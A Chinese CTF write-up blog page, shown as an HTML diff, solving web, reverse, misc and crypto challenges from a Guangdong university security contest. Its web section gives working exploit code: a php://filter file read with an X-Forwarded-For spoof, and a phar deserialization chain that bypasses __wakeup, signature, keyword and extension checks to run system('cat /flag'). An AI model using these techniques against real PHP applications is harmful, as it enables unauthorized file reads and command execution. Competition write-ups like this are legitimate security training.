@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"xloudmax.fun","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="广东省大学生网络安全竞赛WP001. 消失的flag使用 php:&#x2F;&#x2F; 伪协议的convert编码格式转换功能读取flag使用header绕过IP检测 12r &#x3D; requests.get(url, params&#x3D;&#123;&quot;file&quot;: &quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-4.UCS-4&#x2F;resource&#x3D;&#x2F;flag&quot;&amp;#12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="广东省大学生网络安全竞赛WP">
+<meta property="og:url" content="http://xloudmax.fun/2024/05/27/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWP/index.html">
+<meta property="og:site_name" content="Xloudmax">
+<meta property="og:description" content="广东省大学生网络安全竞赛WP001. 消失的flag使用 php:&#x2F;&#x2F; 伪协议的convert编码格式转换功能读取flag使用header绕过IP检测 12r &#x3D; requests.get(url, params&#x3D;&#123;&quot;file&quot;: &quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-4.UCS-4&#x2F;resource&#x3D;&#x2F;flag&quot;&amp;#12">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/fNpqBO3WGlLzRra.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/neJZQvC6DciIAKL.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/KPoR47r5yHbfMYw.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/ZQnXvAR4oBrGDPu.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/Qr6njVPBoRiYEZk.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/VTHfMB5AJDX9R6t.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/CuBeNLIrmZavjQz.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/tF3ofXVnDsWMQcB.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/7UhWoPqRIVl1dCn.png">
+<meta property="og:image" content="https://s2.loli.net/2024/05/27/SaJGhKCLNUBFIM1.png">
+<meta property="article:published_time" content="2024-05-27T07:16:46.000Z">
+<meta property="article:modified_time" content="2024-05-27T07:15:41.000Z">
+<meta property="article:author" content="Xloudmax">
+<meta property="article:tag" content="reverse">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/05/27/fNpqBO3WGlLzRra.png">
+
+<link rel="canonical" href="http://xloudmax.fun/2024/05/27/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>广东省大学生网络安全竞赛WP | Xloudmax</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  <meta charset="UTF-8">
+  <title>live2d-demo</title>
+  <script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+  <!-- Live2DCubismCore -->
+  <script src="https://cdn.jsdelivr.net/gh/litstronger/live2d-moc3@master/js/frame/live2dcubismcore.min.js"></script>
+  <!-- Include Pixi. -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/4.6.1/pixi.min.js"></script>
+  <!-- Include Cubism Components. -->
+  <script src="https://cdn.jsdelivr.net/gh/litstronger/live2d-moc3@master/js/live2dcubismframework.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/litstronger/live2d-moc3@master/js/live2dcubismpixi.js"></script>
+  <!-- User's Script -->
+  <script src="https://cdn.jsdelivr.net/gh/litstronger/live2d-moc3@master/js/l2d.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/litstronger/live2d-moc3@master/js/main.js"></script>
+  <style>
+  </style>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Xloudmax</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Note</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://xloudmax.fun/2024/05/27/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Xloudmax">
+      <meta itemprop="description" content="Welc0me t0 the base">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xloudmax">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          广东省大学生网络安全竞赛WP
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-05-27 15:16:46 / 修改时间：15:15:41" itemprop="dateCreated datePublished" datetime="2024-05-27T15:16:46+08:00">2024-05-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">广东省大学生网络安全竞赛</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="广东省大学生网络安全竞赛WP"><a href="#广东省大学生网络安全竞赛WP" class="headerlink" title="广东省大学生网络安全竞赛WP"></a>广东省大学生网络安全竞赛WP</h1><h2 id="001-消失的flag"><a href="#001-消失的flag" class="headerlink" title="001. 消失的flag"></a>001. 消失的flag</h2><p>使用 php:// 伪协议的convert编码格式转换功能读取flag<br>使用header绕过IP检测</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(url, params=&#123;<span class="string">&quot;file&quot;</span>: <span class="string">&quot;php://filter/convert.iconv.UCS-4.UCS-4/resource=/flag&quot;</span>&#125;, headers=&#123;<span class="string">&quot;X-Forwarded-For&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+<h2 id="003-unserialize-web"><a href="#003-unserialize-web" class="headerlink" title="003. unserialize_web"></a>003. unserialize_web</h2><p>扫描看到源码www.tar.gz，使用phar反序列化读取/flag，需要绕过__wakeup关键字检测、文件后缀检测、phar反序列化。生成恶意对象放入phar.phar：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 反序列化payload构造</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$val1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$val2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$val3</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;val1 = <span class="string">&quot;val1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;val2 = <span class="string">&quot;val2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;val1 === <span class="string">&quot;file&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;val2 === <span class="string">&quot;exists&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\s*system\s*\(\s*\&#x27;cat\s+\/[^;]*\&#x27;\s*\);\s*$/&#x27;</span> <span class="variable">$this</span>-&gt;val3)) &#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;val3);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Access Denied&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__access</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$Var</span> = <span class="string">&quot;Access Denied&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$Var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;val1 = <span class="string">&quot;exists&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;val2 = <span class="string">&quot;file&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件存在&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;val1=<span class="string">&#x27;file&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span>-&gt;val2=<span class="string">&#x27;exists&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span>-&gt;val3=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开phar文件</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">// 生成时后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 放入对象</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加压缩的文件（test为其中的内容）</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;use phar.phar&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>修改phar.phar绕过__wakeup：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sha1_hash</span>(<span class="params">s</span>):</span><br><span class="line">    sha1_obj = hashlib.sha1()</span><br><span class="line">    sha1_obj.update(s)</span><br><span class="line">    <span class="keyword">return</span> sha1_obj.digest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;php_docker/phar.phar&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    content = content.replace(<span class="string">b&#x27;&quot;File&quot;:3&#x27;</span>, <span class="string">b&#x27;&quot;File&quot;:4&#x27;</span>)</span><br><span class="line">    content = content[:-<span class="number">28</span>] + sha1_hash(content[:-<span class="number">28</span>]) + content[-<span class="number">8</span>:]</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;php_docker/modified.phar&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">    out.write(content)</span><br></pre></td></tr></table></figure>
+<p>使用gzip -f modified.phar压缩绕过关键字检测，得到modified.phar.gz，重命名为mod3.jpg绕过文件后缀检测并上传。最后触发，拿到flag：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://1c300fa3-159a-bef7-2fd1-6e7839227374b834.tq.jxsec.cn:30486/download.php&quot;</span></span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">&quot;file&quot;</span>: <span class="string">&quot;phar://upload/mod3.jpg/test.jpg&quot;</span>&#125;)</span><br><span class="line">r.encoding = r.apparent_encoding</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="002-re2"><a href="#002-re2" class="headerlink" title="002. re2"></a>002. re2</h3><p>IDA查看main函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_401170(<span class="string">&quot;you win: please the key decrypt flag.\r\n&quot;</span>);</span><br><span class="line">sub_401170(<span class="string">&quot;flag:uQBF11zD6uYP9kJhRhL8OeesPaaZQQvbl3wx7Ik0T6g=. alg=AES\r\n&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>使用findcrypt插件找到CRC32。<img src="https://s2.loli.net/2024/05/27/fNpqBO3WGlLzRra.png" alt="image-20240527144807827"></p>
+<p>crc32和算法解出key：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rand1-key：28672 12779520 1744830464 129 13824</span><br><span class="line">rand2-key：2 9 10 14 5</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2024/05/27/neJZQvC6DciIAKL.png" alt="image-20240527144822061"></p>
+<p><img src="https://s2.loli.net/2024/05/27/KPoR47r5yHbfMYw.png" alt="image-20240527144828947"></p>
+<p>从内存里面dump出来16byte，获得真key。base64解密得到flag。</p>
+<p><img src="https://s2.loli.net/2024/05/27/ZQnXvAR4oBrGDPu.png" alt="image-20240527144837259"></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="001-猜一猜"><a href="#001-猜一猜" class="headerlink" title="001. 猜一猜"></a>001. 猜一猜</h3><p><img src="https://s2.loli.net/2024/05/27/Qr6njVPBoRiYEZk.png" alt="image-20240527144844608"></p>
+<p>压缩包有密码，观察文件名像md5：<a target="_blank" rel="noopener" href="https://www.cmd5.com/。附件文件名MD5解密得到密码：a1478520。">https://www.cmd5.com/。附件文件名MD5解密得到密码：a1478520。</a></p>
+<p><img src="https://s2.loli.net/2024/05/27/VTHfMB5AJDX9R6t.png" alt="image-20240527144851817"></p>
+<p><img src="https://s2.loli.net/2024/05/27/CuBeNLIrmZavjQz.png" alt="image-20240527144855779"></p>
+<p>使用010editor打开，补全PNG文件头得到一个二维码。扫码转到网站：</p>
+<p><img src="https://s2.loli.net/2024/05/27/tF3ofXVnDsWMQcB.png" alt="image-20240527144904113"></p>
+<p><img src="https://s2.loli.net/2024/05/27/7UhWoPqRIVl1dCn.png" alt="image-20240527144908308"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">❀❁❀❇❀✼❀❂✿❆✿✽❁❀✿✾❂❅✿❄❂❉❀✿❂❆❀❃❀✿❂❆✿❀❁✾✻✿❁❁❀❁❂❊✻❂✿❈=</span><br></pre></td></tr></table></figure>
+<p>花朵密码，在线解密<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo</a></p>
+<p><img src="https://s2.loli.net/2024/05/27/SaJGhKCLNUBFIM1.png" alt="image-20240527144914451"></p>
+<p>得到flag{rUsJyNdKhdKuS4VfO7}。</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="001-encipher"><a href="#001-encipher" class="headerlink" title="001. encipher"></a>001. encipher</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">d = <span class="number">4885628697024674802233453512637565599092248491488767824821990279922756927662223348312748794983451796542248787267207054348962258716585568185354414099671493917947012747791554070655258925730967322717771647407982984792632771150018212620323323635510053326184087327891569331050475507897640403090397521797022070233</span></span><br><span class="line">N = <span class="number">89714050971394259600440975863751229102748301873549839432714703551498380713981264101533375672970154214062583012365073892089644031804109941766201243163398926438698369735588338279544152140859123834763870759757751944228350552806429642516747541162527058800402619575257179607422628877017180197777983487523142664487</span></span><br><span class="line">ciphertext = <span class="number">67254133265602132458415338912590207677514059205474875492945840960242620760650527587490927820914970400738307536068560894182603885331513473363314148815933001614692570010664750071300871546575845539616570277302220914885734071483970427419582877989670767595897758329863040523037547687185382294469780732905652150451</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(ciphertext, d, N)</span><br><span class="line">m = long_to_bytes(m)</span><br><span class="line">l = <span class="built_in">len</span>(m)</span><br><span class="line">key = <span class="string">b&#x27;Life is like an ocean only strong-minded can reach the other shore&#x27;</span></span><br><span class="line">key = key[:l]</span><br><span class="line">m = strxor(m, key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m, l)</span><br></pre></td></tr></table></figure>
+<p>得到flag{1s_Pa33w0rd_1y2u22}</p>
+<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
+    </div>
+
+    
+    
+    
+    
+    
+      <div>
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:24px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+      </div>
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Xloudmax
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://xloudmax.fun/2024/05/27/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWP/" title="广东省大学生网络安全竞赛WP">http://xloudmax.fun/2024/05/27/广东省大学生网络安全竞赛WP/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/reverse/" rel="tag"># reverse</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/05/10/ISSC/ssXl9SF0HvBbMAtG/" rel="prev" title="ISCC-1">
+      <i class="fa fa-chevron-left"></i> ISCC-1
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/05/27/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/" rel="next" title="选择排序">
+      选择排序 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
